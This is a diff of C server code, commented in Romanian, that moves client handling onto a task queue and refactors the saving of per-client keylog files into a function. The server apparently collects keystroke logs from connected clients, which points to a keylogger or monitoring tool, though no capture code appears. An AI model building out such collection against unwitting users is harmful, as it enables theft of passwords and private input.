@@ -14,6 +14,7 @@
 #include <time.h>
 
 extern clientHandler_t clientHndler;
+extern task_queue_t taskQueue; // Coada de task-uri
 
 void handleOpcode(message_t msg, int clientSock)
 {
@@ -91,58 +92,75 @@ void handleOpcode(message_t msg, int clientSock)
     }
 }
 
-void *handle_client(void *params)
+void saveKeylog(int client_sock)
 {
-    parameters_t *args = (parameters_t *)params;
-
-    message_t client_message;
-    int read_size;
-
-    while ((read_size = recv(args->client_sock, &client_message, sizeof(client_message), 0)) > 0)
-    {
-        client_message.buffer[client_message.size] = '\0';
-        // printf("Mesaj primit de la %d(OpCode: %c): %s\n", args->client_sock, client_message.opCode, client_message.buffer);
-        // fflush(0);
-        handleOpcode(client_message, args->client_sock);
-    }
-
-    /*******************************Aici se salveaza fisierul de keylog*************************** */
-    // TO DO: De pus codul de mai jos intr-o functie
-
     char filename[BUFFER_SIZE];
-    if (clientHndler.clientsAttr[args->client_sock].keylogger_fd != -1)
+    if (clientHndler.clientsAttr[client_sock].keylogger_fd != -1)
     {
-        snprintf(filename, BUFFER_SIZE, "%s/keylog%s.txt", clientHndler.clientsAttr[args->client_sock].name, clientHndler.clientsAttr[args->client_sock].name);
-        close(clientHndler.clientsAttr[args->client_sock].keylogger_fd);
+        snprintf(filename, BUFFER_SIZE, "%s/keylog%s.txt",
+                 clientHndler.clientsAttr[client_sock].name,
+                 clientHndler.clientsAttr[client_sock].name);
+        close(clientHndler.clientsAttr[client_sock].keylogger_fd);
+
         char newFn[BUFFER_SIZE];
         time_t now = time(NULL);
         struct tm *t = localtime(&now);
         char timestamp[64];
         strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M:%S", t);
 
-        snprintf(newFn, BUFFER_SIZE, "%s/Keylog_%s_%s.txt", clientHndler.clientsAttr[args->client_sock].name, clientHndler.clientsAttr[args->client_sock].name, timestamp);
+        snprintf(newFn, BUFFER_SIZE, "%s/Keylog_%s_%s.txt",
+                 clientHndler.clientsAttr[client_sock].name,
+                 clientHndler.clientsAttr[client_sock].name,
+                 timestamp);
         rename(filename, newFn);
     }
 
-    if (clientHndler.clientsAttr[args->client_sock].keylogger_fd != -1)
+    if (clientHndler.clientsAttr[client_sock].keylogger_fd != -1)
     {
-        close(clientHndler.clientsAttr[args->client_sock].keylogger_fd);
-        clientHndler.clientsAttr[args->client_sock].keylogger_fd = -1;
+        close(clientHndler.clientsAttr[client_sock].keylogger_fd);
+        clientHndler.clientsAttr[client_sock].keylogger_fd = -1;
     }
-    for (int i = 0; i < clientHndler.numberClients; i++)
+}
+
+void *handle_client(void *params)
+{
+    while (1)
     {
-        if (clientHndler.socketsClients[i] == args->client_sock)
+        // Scoatem un task din coadă
+        task_t task = dequeueTask(&taskQueue);
+
+        int client_sock = task.client_sock;
+        message_t client_message;
+        int read_size;
+
+        // Procesăm mesajele clientului
+        while ((read_size = recv(client_sock, &client_message, sizeof(client_message), 0)) > 0)
         {
-            for (int j = i; j < clientHndler.numberClients - 1; j++)
-            {
-                clientHndler.socketsClients[j] = clientHndler.socketsClients[j + 1];
-            }
-            clientHndler.numberClients--;
-            break;
+            client_message.buffer[client_message.size] = '\0';
+            handleOpcode(client_message, client_sock);
         }
+
+        // Salvăm fișierul de keylog (cod refactorizat într-o funcție separată)
+        saveKeylog(client_sock);
+
+        // Scoatem clientul din lista de clienți activi
+        pthread_mutex_lock(&clientHndler.mutex);
+        for (int i = 0; i < clientHndler.numberClients; i++)
+        {
+            if (clientHndler.socketsClients[i] == client_sock)
+            {
+                for (int j = i; j < clientHndler.numberClients - 1; j++)
+                {
+                    clientHndler.socketsClients[j] = clientHndler.socketsClients[j + 1];
+                }
+                clientHndler.numberClients--;
+                break;
+            }
+        }
+        pthread_mutex_unlock(&clientHndler.mutex);
+
+        close(client_sock);
     }
-    close(args->client_sock);
-    free(params);
 
     return NULL;
 }
